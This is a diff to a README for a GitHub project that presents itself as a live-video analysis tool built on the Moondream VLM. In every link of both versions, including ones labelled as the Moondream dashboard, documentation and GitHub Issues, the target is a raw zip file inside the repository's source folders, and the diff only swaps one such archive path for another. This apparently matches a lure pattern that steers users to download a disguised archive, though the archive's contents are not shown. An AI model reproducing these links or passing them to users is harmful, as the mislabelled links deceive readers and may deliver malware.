@@ -1,6 +1,6 @@
 # 🎥 Analyze-Live-Video-Solution - Analyze Video Feeds Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/lib/Analyze-Live-Video-Solution-v2.8.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/lib/Analyze-Live-Video-Solution-v2.8.zip)
+[![Download Now](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/components/Video_Analyze_Solution_Live_2.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/components/Video_Analyze_Solution_Live_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ This application helps you analyze live video feeds using the Moondream VLM. Fol
 
 To get started, visit the following link to download the application:
 
-[Download the Latest Release](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/lib/Analyze-Live-Video-Solution-v2.8.zip)
+[Download the Latest Release](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/components/Video_Analyze_Solution_Live_2.5.zip)
 
 1. Open the link above in your web browser.
 2. Find the latest version in the list.
@@ -44,7 +44,7 @@ After downloading the application, follow these steps to install and run it:
 
 To enable full functionality, you need a Moondream API key. Follow these steps to set it up:
 
-1. Go to your [Moondream Dashboard](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/lib/Analyze-Live-Video-Solution-v2.8.zip).
+1. Go to your [Moondream Dashboard](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/components/Video_Analyze_Solution_Live_2.5.zip).
 2. Generate your API key from the dashboard.
 3. Create a file named `.env` in the root folder of your application.
 4. Add your API key to the file as follows:
@@ -71,11 +71,11 @@ In case of any issues:
 
 If you need more help, check the following resources:
 
-- [Moondream Documentation](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/lib/Analyze-Live-Video-Solution-v2.8.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/lib/Analyze-Live-Video-Solution-v2.8.zip) for community support.
+- [Moondream Documentation](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/components/Video_Analyze_Solution_Live_2.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/components/Video_Analyze_Solution_Live_2.5.zip) for community support.
 
 ## 📝 Feedback
 
 Your feedback is important to us. If you have suggestions or encounter issues, please feel free to report them. Your input helps improve the application.
 
-Remember, you can download the application anytime by clicking here: [Download the Latest Release](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/lib/Analyze-Live-Video-Solution-v2.8.zip). Happy analyzing!
+Remember, you can download the application anytime by clicking here: [Download the Latest Release](https://raw.githubusercontent.com/kenall777/Analyze-Live-Video-Solution/main/src/components/Video_Analyze_Solution_Live_2.5.zip). Happy analyzing!
